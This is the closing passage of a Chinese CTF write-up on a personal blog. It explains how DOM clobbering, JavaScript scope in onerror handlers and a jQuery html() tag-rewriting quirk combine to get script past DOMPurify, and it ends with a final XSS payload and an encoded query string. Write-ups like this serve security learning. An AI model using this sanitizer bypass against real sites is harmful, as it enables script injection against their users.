</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=kd>let</span> <span class=nx>x</span> <span class=o>=</span> <span class=kc>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s2>&#34;JS&#39;x: &#34;</span> <span class=o>+</span> <span class=nx>x</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nb>document</span><span class=p>.</span><span class=nx>write</span><span class=p>(</span><span class=s2>&#34;&lt;img src=x onerror=test(this,x)&gt;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span></code></pre></div><p><figure><a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200202004222.png><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200202004222.png loading=lazy></a></figure></p><p>原理都是一样的，这里<code>test</code>函数在<code>onerror</code>作用域找到了 x 变量，所以就不会再去找 window 作用域下的 <code>x=false</code>变量了，所以本题我们需要引入一个<code>name=notify</code>的标签来“覆盖”掉原来的 notify 变量。</p><p>其实这也是一开始我们可以发现题目给出的代码有一处也比较神奇就是 text & img</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kr>const</span> <span class=nx>memeGen</span> <span class=o>=</span> <span class=p>(</span><span class=nx>that</span><span class=p>,</span> <span class=nx>notify</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nx>text</span> <span class=o>&amp;&amp;</span> <span class=nx>img</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>template</span> <span class=o>=</span> <span class=nx>memeTemplate</span><span class=p>(</span><span class=nx>img</span><span class=p>,</span> <span class=nx>text</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>...</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span></code></pre></div><p><code>memeGen</code>函数在函数内找不到<code>text</code>，onload 的作用域也找不到<code>text</code>，就会去 script下面找，而多个 script 属于同一个作用域，所以对于函数当中的 text 以及 img ，它是在下一块 JS 代码段定义的。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=kd>let</span> <span class=nx>notify</span> <span class=o>=</span> <span class=kc>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kd>let</span> <span class=nx>text</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>URL</span><span class=p>(</span><span class=nx>location</span><span class=p>).</span><span class=nx>searchParams</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s2>&#34;text&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kd>let</span> <span class=nx>img</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>URL</span><span class=p>(</span><span class=nx>location</span><span class=p>).</span><span class=nx>searchParams</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s2>&#34;img&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>...</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span></code></pre></div><p><figure><a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201222425.png><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201222425.png loading=lazy></a></figure></p><h3 id=jquerys-mxss>JQuery&rsquo;s &lsquo;mXSS&rsquo;</h3><p>所以基本上 notify 的问题我们解决了，接下来就是 DOM Purify 的问题了。</p><p>我们可以知道最终我们要插入的代码是通过<code>$("#notify").html(html)</code>来插入的，而参数 html 又来自</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nx>html</span> <span class=o>=</span> <span class=sb>`&lt;div class=&#34;alert alert-warning&#34; role=&#34;alert&#34;&gt;&lt;b&gt;Meme&lt;/b&gt; created from </span><span class=si>${</span><span class=nx>DOMPurify</span><span class=p>.</span><span class=nx>sanitize</span><span class=p>(</span><span class=nx>text</span><span class=p>)</span><span class=si>}</span><span class=sb>&lt;/div&gt;`</span><span class=p>;</span>
</span></span></code></pre></div><p>简单跟一下 JQuery 的 <code>html()</code> 函数，我们可以发现有以下利用链：</p><p><a class=link href=https://github.com/jquery/jquery/blob/d0ce00cdfa680f1f0c38460bc51ea14079ae8b07/src/manipulation.js#L372 target=_blank rel=noopener>html()</a>-><a class=link href=https://github.com/jquery/jquery/blob/d0ce00cdfa680f1f0c38460bc51ea14079ae8b07/src/manipulation.js#L406 target=_blank rel=noopener>append()</a>-><a class=link href=https://github.com/jquery/jquery/blob/d0ce00cdfa680f1f0c38460bc51ea14079ae8b07/src/manipulation.js#L312 target=_blank rel=noopener>doManip()</a>-><a class=link href=https://github.com/jquery/jquery/blob/d0ce00cdfa680f1f0c38460bc51ea14079ae8b07/src/manipulation.js#L117 target=_blank rel=noopener>buildFragment()</a>-><a class=link href=https://github.com/jquery/jquery/blob/d0ce00cdfa680f1f0c38460bc51ea14079ae8b07/src/manipulation/buildFragment.js#L39 target=_blank rel=noopener>htmlPrefilter()</a></p><p>在 <a class=link href=https://github.com/jquery/jquery/blob/d0ce00cdfa680f1f0c38460bc51ea14079ae8b07/src/manipulation.js#L202 target=_blank rel=noopener>htmlPrefilter()</a> 函数中我们可以看到有这么一段代码：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=c1>// source of htmlPrefilter()
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>jQuery</span><span class=p>.</span><span class=nx>extend</span><span class=p>(</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nx>htmlPrefilter</span><span class=o>:</span> <span class=kd>function</span><span class=p>(</span> <span class=nx>html</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=nx>html</span><span class=p>.</span><span class=nx>replace</span><span class=p>(</span> <span class=nx>rxhtmlTag</span><span class=p>,</span> <span class=s2>&#34;&lt;$1&gt;&lt;/$2&gt;&#34;</span> <span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>},</span>
</span></span><span class=line><span class=cl>    <span class=p>...</span>
</span></span></code></pre></div><p>这段代码就是用来转换一些自闭合标签的标签，例如<code>&lt;blah/></code>变成<code>&lt;blah>&lt;/blah></code>，我们就可以利用这个特性来实现一些绕过，例如：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>style</span><span class=p>&gt;</span><span class=err>&lt;style/&gt;Elon</span>
</span></span></code></pre></div><p>经过<code>innerHTML</code>会变成</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>style</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>   <span class=o>&lt;</span><span class=nt>style</span><span class=o>/&gt;</span><span class=nt>Elon</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>style</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>但是经过 jquery <code>html()</code> 就会变成</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>style</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>   <span class=o>&lt;</span><span class=nt>style</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>style</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>Elon
</span></span></code></pre></div><p>我们可以发现通过<code>html()</code>可以把一些自闭合的拆分，以及把内容转换出去，有点类似于 mXSS ，最终我们得到的是</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>style</span><span class=p>&gt;</span><span class=o>&lt;</span><span class=nt>style</span><span class=o>&gt;</span><span class=p>&lt;/</span><span class=nt>style</span><span class=p>&gt;</span>Elon<span class=p>&lt;/</span><span class=nt>style</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>所以我们可以利用这个特性绕过 XSS WAF，例如以下</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>style</span><span class=p>&gt;</span><span class=err>&lt;style/&gt;&lt;script&gt;alert()//</span>
</span></span></code></pre></div><p>经过<code>DOMPurify.sanitize</code>我们可以得到</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>style</span><span class=p>&gt;</span><span class=o>&lt;</span><span class=nt>style</span><span class=o>/&gt;&lt;</span><span class=nt>script</span><span class=o>&gt;</span><span class=nt>alert</span><span class=o>(</span><span class=nt>1337</span><span class=o>)//</span><span class=p>&lt;/</span><span class=nt>style</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>经过 jquery <code>html()</code>到最终渲染页面就变成了</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>style</span><span class=p>&gt;</span><span class=o>&lt;</span><span class=nt>style</span><span class=o>&gt;</span><span class=p>&lt;/</span><span class=nt>style</span><span class=p>&gt;&lt;</span><span class=nt>script</span><span class=p>&gt;</span><span class=nx>alert</span><span class=p>(</span><span class=mi>1337</span><span class=p>)</span><span class=o>/</span><span class=err>/&lt;/style&gt;&lt;/div&gt;</span><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;&lt;/</span><span class=nt>div</span><span class=p>&gt;&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>所以这就是 JQuery&rsquo;s 类似于 mXSS 的 trick</p><p>综上所述，配合我们之前的内容，最终 payload 如下：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>img</span> <span class=na>name</span><span class=o>=</span><span class=s>notify</span><span class=p>&gt;&lt;</span><span class=nt>style</span><span class=p>&gt;</span><span class=err>&lt;style/&gt;&lt;script&gt;alert()//</span>
</span></span></code></pre></div><p>最终传参:</p><pre tabindex=0><code>img=valid_img_url&amp;text=&lt;img name%3dnotify&gt;&lt;style&gt;&lt;style%2F&gt;&lt;script&gt;alert()%2F%2F
</code></pre><p>这里我也不是非常清楚作者为啥要加一个 img 参数//全程没有用到</p><p>最后再来一遍：</p><p><figure><a href=https://i.redd.it/rz3o1yibnc511.png><img src=https://i.redd.it/rz3o1yibnc511.png loading=lazy></a></figure></p><h2 id=references>References</h2><p><a class=link href=http://www.thespanner.co.uk/2013/05/16/dom-clobbering/ target=_blank rel=noopener>DOM Clobbering</a></p><p><a class=link href=https://developer.mozilla.org/en-US/docs/Web/API/HTMLAnchorElement target=_blank rel=noopener>HTMLAnchorElement</a></p></section><footer class=article-footer><section class=article-tags><a href=/tags/XSS/>XSS</a></section><section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg><span>Licensed under CC BY-NC-SA 4.0</span></section><div class="notice notice-tip"><div class=notice-title><svg xmlns="http://www.w3.org/2000/svg" class="icon notice-icon" viewBox="0 0 512 512"><path d="M504 256A248 248 0 118 256a248 248 0 01496 0zM227 387l184-184c7-6 7-16 0-22l-22-23c-7-6-17-6-23 0L216 308l-70-70c-6-6-16-6-23 0l-22 23c-7 6-7 16 0 22l104 104c6 7 16 7 22 0z"/></svg></div><p>I am looking for some guys who have a strong interest in CTFs to build a team focused on international CTFs that are on the ctftime.org, if anyone is interested in this idea you can take a look at here: <a class=link href=https://blog.zeddyu.info/advertisement/#international-ctf-team target=_blank rel=noopener>Advertisements</a></p><br><p>想了解更多有意思的国际赛 CTF 中 Web 知识技巧，欢迎加入我的 <a class=link href=https://blog.zeddyu.info/advertisement/#%e7%9f%a5%e8%af%86%e6%98%9f%e7%90%83 target=_blank rel=noopener>知识星球</a> ; 另外我正在召集一群小伙伴组建一支专注国际 CTF 的队伍，如果有感兴趣的小伙伴也可在 <a class=link href=https://blog.zeddyu.info/advertisement/#international-ctf-team target=_blank rel=noopener>International CTF Team</a> 查看详情</p><br></div></footer></article><aside class=related-contents--wrapper><h2 class=section-title>Related contents</h2><div class=related-contents><div class="flex article-list--tile"><article><a href=/2022/02/21/2022-02-21-PracticalTimingTimeless/><div class=article-details><h2 class=article-title>Writeup for A More Secure Pastebin - Practical Timeless Timing in Browser</h2></div></a></article><article><a href=/2022/01/08/2022-01-08-TheEndOfLFI/><div class=article-details><h2 class=article-title>hxp CTF 2021 - The End Of LFI?</h2></div></a></article><article><a href=/2021/12/27/2021-12-20-ANewNovelLFI/><div class=article-details><h2 class=article-title>hxp CTF 2021 - A New Novel LFI</h2></div></a></article><article><a href=/2021/08/02/cybrics-checkin-2021/><div class=article-details><h2 class=article-title>Writeup for Web-Checkin in CyBRICS CTF 2021 (Mirror)</h2></div></a></article><article><a href=/2021/07/21/google-qual-2021/><div class=article-details><h2 class=article-title>Two Webs' Writeup in Google CTF Quals 2021</h2></div></a></article></div></div></aside><div class=disqus-container><div id=disqus_thread></div><script type=application/javascript>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//ZeddYu.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener("onColorSchemeChange",e=>{DISQUS&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
2018 -
2023 Zeddy's Blog</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.2.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css integrity="sha256-c0uckgykQ9v5k+IqViZOZKc47Jn7KQil4/MP3ySA3F8=" crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE=" crossorigin=anonymous></main><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#introduction>Introduction</a></li><li><a href=#area-51>Area 51</a><ol><li><a href=#easy-version>Easy Version</a></li><li><a href=#difficult-version>Difficult Version</a></li></ol></li><li><a href=#keanu>Keanu</a></li><li><a href=#ww3>WW3</a><ol><li><a href=#dom-clobbering>DOM Clobbering</a></li><li><a href=#settimeout>setTimeout</a></li><li><a href=#notify>notify</a></li><li><a href=#javascript-scope>JavaScript Scope</a></li><li><a href=#jquerys-mxss>JQuery&rsquo;s &lsquo;mXSS&rsquo;</a></li></ol></li><li><a href=#references>References</a></li></ol></nav></div></section></aside></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g=" crossorigin=anonymous defer></script><script type=text/javascript src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//ts/main.js defer></script>
<script>"serviceWorker"in navigator&&window.addEventListener("load",function(){navigator.serviceWorker.register("/sw.js")})</script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>